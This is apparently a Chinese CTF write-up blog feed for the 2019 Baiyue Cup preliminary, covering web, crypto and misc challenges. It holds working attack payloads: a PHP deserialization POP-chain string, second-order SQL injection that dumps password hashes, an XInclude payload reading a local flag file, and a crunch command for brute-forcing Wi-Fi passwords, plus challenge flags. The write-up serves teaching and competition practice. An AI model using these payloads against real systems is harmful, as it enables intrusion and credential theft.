<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">280</span></span><br><span class="line">y = <span class="number">280</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()</span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
<p><strong>aes</strong>解密得到<strong>moctf{D0_You_1ik3_tO_pAinH_wi4h_pi8e1}</strong>。</p>
<h5 id="一万年的爱有多久">一万年的爱有多久</h5>
<p>嵌套压缩包解压。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">zfile = zipfile.ZipFile(<span class="string">&#x27;KIhn9j7FfG.zip&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> zfile.namelist():</span><br><span class="line">        data = zfile.read(filename)</span><br><span class="line">        file = <span class="built_in">open</span>(filename, <span class="string">&#x27;w+b&#x27;</span>)</span><br><span class="line">        file.write(data)</span><br><span class="line">        file.close()</span><br><span class="line">        <span class="built_in">print</span> filename</span><br><span class="line">        zfile = zipfile.ZipFile(filename[:],<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解</title>
    <url>/2019-BYB-Preliminary/</url>
    <content><![CDATA[<p>垃圾比赛，原题五连击加一题<strong>PWN</strong>改。</p>
<span id="more"></span>
<h3 id="web">Web</h3>
<h4 id="babyphp">babyphp</h4>
<p>京津冀大学生竞赛原题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source . <span class="string">&#x27;解析开始&#x27;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chal</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>POP</strong>链的终点是<strong>Read</strong>类中的**__invoke()**函数，触发条件是对象尝试被以函数的方式调用的时候。</p>
<p>那么应该是选择<strong>Test</strong>类中的**__get()<strong>函数来触发，而</strong>__get()**当访问不存在的成员变量时会被触发。</p>
<p>这时看<strong>Show</strong>类，**__toString()<strong>函数访问了</strong>$str<strong>数组中</strong>str<strong>对应的值中的</strong>source<strong>变量，恰好</strong>Test<strong>类中无</strong>source<strong>变量，可以调用</strong>Test<strong>类中的</strong>__get()**函数。</p>
<p>而当**__construct()<strong>函数中的</strong>echo<strong>函数将对象当做变量调用时，会触发</strong>Show<strong>类中的</strong>__toString()**函数。</p>
<p>至此，<strong>POP</strong>链形成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;fllllllaaaaaag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;params = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;str = <span class="keyword">array</span>(<span class="string">&#x27;str&#x27;</span>=&gt;<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ?chal=O%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3BO%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3Bs%3A9%3A&quot;index.php&quot;%3Bs%3A3%3A&quot;str&quot;%3Ba%3A1%3A%7Bs%3A3%3A&quot;str&quot;%3BO%3A4%3A&quot;Test&quot;%3A1%3A%7Bs%3A6%3A&quot;params&quot;%3BO%3A4%3A&quot;Read&quot;%3A1%3A%7Bs%3A9%3A&quot;%00Read%00var&quot;%3Bs%3A18%3A&quot;fllllllaaaaaag.php&quot;%3B%7D%7D%7D%7Ds%3A3%3A&quot;str&quot;%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
<h4 id="babygame">babygame</h4>
<p>一道二次注入，注册处利用查询的用户名截取一定长度来可以进行引号逃逸。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 注册用户名</span><br><span class="line">south\\\\\\\\\\\\\&#x27;</span><br><span class="line"># 插入数据库</span><br><span class="line">south\\\\\\\\\\\\\\\\\\\\\\\\\\\&#x27;</span><br><span class="line"># 取出用户查询的用户名</span><br><span class="line">south\\\\\\\\\\\\\\\\\\\\\\\\\</span><br></pre></td></tr></table></figure>
<p>进去后到了<strong>/manage.php?msgid=1</strong>页面。</p>
<p>猜测此处<strong>sql</strong>查询语句如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select password from user where username=&#x27;&#x27; and msgid=&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
<p>那么此时查询语句应该为。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select password from user where username=&#x27;south\\\\\\\\\\\\\\\\\\\\\\\\\&#x27; and msgid=&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
<p>尝试构造。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage.php?msgid=union select 1,2,3,4 from users #</span><br></pre></td></tr></table></figure>
<p>回显为<strong>3</strong>，确认有效，最后构造。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage.php?msgid=union select 1,2,group_concat(password),4 from users #</span><br></pre></td></tr></table></figure>
<p>得到<strong>251471f34244cb6cd61f6b64c63f7b1a</strong>，去<strong>tools.php</strong>下查询得到<strong>ChunQiuGame</strong>。</p>
<p>登陆<strong>admin</strong>后提示<strong>xxe</strong>，但是无法读取外部实体，可以使用<strong>xinclude</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=%3Croot%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%0A%20%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fflag%22%20parse%3D%22text%22%2F%3E%0A%3C%2Froot%3E</span><br><span class="line"># flag&#123;f784a3cc-d53f-4440-9456-f050e6ac67e0&#125;</span><br></pre></td></tr></table></figure>
<h3 id="crypto">Crypto</h3>
<h4 id="math">math</h4>
<p>源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = s2n(flag)</span><br><span class="line">a = getRandomRange(<span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">499</span>), <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>))</span><br><span class="line">b = getRandomRange(<span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">499</span>), <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>))</span><br><span class="line">p = a * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + b</span><br><span class="line">q = b * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + a</span><br><span class="line"><span class="built_in">print</span> p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = getRandomInteger(<span class="number">100</span>)</span><br><span class="line">p = next_prime(p + c)</span><br><span class="line">q = next_prime(q + c)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line">flag = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
<p>考数学，将<strong>pow(10,
500)</strong>设为常数<strong>s</strong>，得到公式<strong>p * q = a * b *
s ² + (a ² + b ²)* s + a * b</strong>。</p>
<p><strong>a *
b</strong>的部分在<strong>pq</strong>的<strong>[:1000]</strong>和<strong>[:1000]</strong>，中间<strong>a
² + b
²</strong>的部分在<strong>pq</strong>的<strong>[500:1500]</strong>。</p>
<p>因此恰有<strong>pq[:500]</strong>和<strong>pq[1500:]</strong>未被污染，分别单独属于<strong>a
* b</strong>的前半部分和后半部分。</p>
<p>而中间的<strong>pq[500:1500]</strong>的前<strong>500</strong>字节含有<strong>a
* b</strong>的后半部分，后<strong>500</strong>字节含有<strong>a *
b</strong>的前半部分，做个简单减法可得。</p>
<p>综上，可得<strong>a * b</strong>和<strong>a ² + b
²</strong>的值，然后根据高中学的那一套变换可以求得<strong>a</strong>和<strong>b</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(a + b) ² = a ² + 2 * a * b + b ²</span><br><span class="line">(a - b) ² = a ² - 2 * a * b + b ²</span><br></pre></td></tr></table></figure>
<p>联立公式解得<strong>a+b</strong>和<strong>a-b</strong>的值，再联立二元一次方程求出<strong>a</strong>和<strong>b</strong>，进而求出第一次的<strong>p</strong>和<strong>q</strong>。</p>
<p>再使用二分法调用<strong>next_prime()</strong>函数求解出第二次的<strong>p</strong>和<strong>q</strong>，最后解得<strong>flag</strong>，脚本如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding = utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pq = <span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span></span><br><span class="line">n = <span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921</span></span><br><span class="line">flag = <span class="number">37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print a * b * pow(10, 1000) + (a * a + b * b) * pow(10, 500) + a * b</span></span><br><span class="line"></span><br><span class="line">a_front = <span class="built_in">str</span>(pq)[:<span class="number">500</span>]</span><br><span class="line">a_after = <span class="built_in">str</span>(pq)[<span class="number">1500</span>:]</span><br><span class="line">a_center = <span class="built_in">str</span>(pq)[<span class="number">500</span>:<span class="number">1500</span>]</span><br><span class="line"><span class="comment"># print a_front, a_center, a_after</span></span><br><span class="line"></span><br><span class="line">a2_b2 = <span class="built_in">int</span>(<span class="string">&quot;1&quot;</span> + a_center) - <span class="built_in">int</span>(a_after + a_front) + <span class="number">1</span></span><br><span class="line">ab = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">int</span>(a_front) - <span class="number">1</span>) + a_after)</span><br><span class="line"><span class="comment"># print a2_b2, ab</span></span><br><span class="line"></span><br><span class="line">a_plus_b = iroot(a2_b2 + <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line">a_reduce_b = iroot(a2_b2 - <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print a_plus_b, a_reduce_b</span></span><br><span class="line"></span><br><span class="line">a_plus_b = <span class="number">125520294471294371756206159368181409945356030402603762503482456202897533387782094536256610499618557722340156388350652825753139764317331244759764232625886315299606875442745587812532678599409403821368176178124423559665940459376956151960208210346359347886654984646062874450883290186056767079719177407287835346204307512502564043099039957758232483284305934705085260831986768250453454694243836141419616105296901321142602722479489972619458888977889921182264113147746483540050001938721542291553506118731266299</span></span><br><span class="line">a_reduce_b = <span class="number">28970382423653526230782087428394120199094608888807510969672174008572263444342743452382065495452410979665183590859836472860381842418270886250846330507167646674351905885014449434182842316793842355041032703945358809543746947830533653096857965009150717206961368552309542092906822247898706652989394172510971441082397663739139074168863166474942514453940979697271097233244125249898829123427276166705668136075753341362350636336479869531538499746880132398933374584887892784910782260556527383469248578187483469</span></span><br><span class="line">a = (a_plus_b + a_reduce_b) // <span class="number">2</span></span><br><span class="line">b = a_plus_b - a</span><br><span class="line">p = a * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + b</span><br><span class="line">q = b * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + a</span><br><span class="line"><span class="comment"># print p, q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># high = 2 ** 100</span></span><br><span class="line"><span class="comment"># low = 0</span></span><br><span class="line"><span class="comment"># c = (high + low) / 2</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     print c</span></span><br><span class="line"><span class="comment">#     new_p = next_prime(p + c)</span></span><br><span class="line"><span class="comment">#     new_q = next_prime(q + c)</span></span><br><span class="line"><span class="comment">#     if new_p * new_q &lt; n:</span></span><br><span class="line"><span class="comment">#         low = c</span></span><br><span class="line"><span class="comment">#         print &quot;p * q &lt; n&quot;</span></span><br><span class="line"><span class="comment">#     elif new_p * new_q &gt; n:</span></span><br><span class="line"><span class="comment">#         high = c</span></span><br><span class="line"><span class="comment">#         print &quot;p * q &gt; n&quot;</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         print new_p, new_q, c</span></span><br><span class="line"><span class="comment">#         p = new_p</span></span><br><span class="line"><span class="comment">#         q = new_q</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     c = (high + low) / 2</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 250059412706552500264745575936</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">250059412706552500264745575936</span></span><br><span class="line">p = next_prime(c + p)</span><br><span class="line">q = next_prime(c + q)</span><br><span class="line">f = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, f)</span><br><span class="line">flag = <span class="built_in">pow</span>(flag, d, n)</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;ddc4205ecd6c22035acae589113bb8aa&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="misc">Misc</h3>
<h4 id="签到">签到</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9&quot;</span></span><br><span class="line"><span class="built_in">print</span> base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># please submit: flag&#123;hello_byb&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="key">key</h4>
<p>原题，找到了<a
href="https://www.cnblogs.com/hardcoreYutian/p/11581185.html">某邀请赛misc
key阉割发行版</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rgb = [<span class="string">&#x27;2f&#x27;</span>, <span class="string">&#x27;3f&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;2e&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;7f&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;7b&#x27;</span>, <span class="string">&#x27;7e&#x27;</span>, <span class="string">&#x27;27&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;64&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;0c&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;16&#x27;</span>, <span class="string">&#x27;7a&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;7b&#x27;</span>, <span class="string">&#x27;32&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;5c&#x27;</span>]</span><br><span class="line">key = <span class="string">&#x27;ISEEU!&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rgb:</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="built_in">ord</span>(key[j]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    j %= <span class="number">6</span></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;265a4cd2-b7f1-4d32-9df7-733edfd2a21b&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="哈尔的移动城堡">哈尔的移动城堡</h4>
<p>把<strong>102%</strong>开头的<strong>GNP</strong>改成<strong>PNG</strong>得到一张背景隐有二维码的图。</p>
<p>后在<strong>PNG</strong>标识符结束后有一个<strong>4B50</strong>开头的幻数，修正为<strong>504B</strong>分离得到压缩包。</p>
<p>再将<strong>ori.jpg</strong>转灰度图后，以<strong>ori-gray.jpg</strong>对<strong>102%.png</strong>做<strong>SUB</strong>操作得到二维码，二维码得到解压码<strong>1tsEz_b14ndVV4t3rM4k</strong>。</p>
<p>对压缩包解密，得到两张图，再次<strong>SUB</strong>操作，得到<strong>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</strong>。</p>
<h4 id="wireless">WireLess</h4>
<p>打开题目提示<strong>password:6666xxxx</strong>，大概是爆破<strong>wifi</strong>密码。
<strong>crunch 8 8 -t 6666%%%% &gt;&gt; wifipass.txt</strong>创建字典。
